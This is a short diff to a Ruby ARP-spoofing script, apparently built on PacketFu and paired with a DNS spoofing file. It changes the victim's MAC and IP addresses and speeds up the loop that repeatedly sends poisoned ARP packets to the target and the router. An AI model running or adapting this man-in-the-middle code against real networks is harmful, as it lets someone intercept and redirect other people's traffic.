@@ -6,10 +6,10 @@ require './gdns.rb'
 
 $iface = "eth0"   # interface to send/recieve from
 $sMac = '08:00:27:48:d2:8f'  # source mac address, eg, address to redirect victim to
-$tMac = '50:e5:49:3a:52:de'  # target mac address, eg, address to poison
+$tMac = '08:00:27:5d:d8:c9'  # target mac address, eg, address to poison
 $rMac = '00:24:b2:4d:b9:1d'  # routers mac address
 $sIP = '10.0.0.68'        # source IP address
-$tIP = '10.0.0.9'        # target IP address
+$tIP = '10.0.0.28'        # target IP address
 $rIP = '10.0.0.1'       # router IP address
 
 $arp_packet_target #= PacketFu::ARPPacket.new()
@@ -46,7 +46,7 @@ def runSpoof()
   # Send out both packets
   caught=false
   while caught==false do
-    sleep 3
+    sleep 1
     $arp_packet_target.to_w($iface)
     $arp_packet_router.to_w($iface)
   end
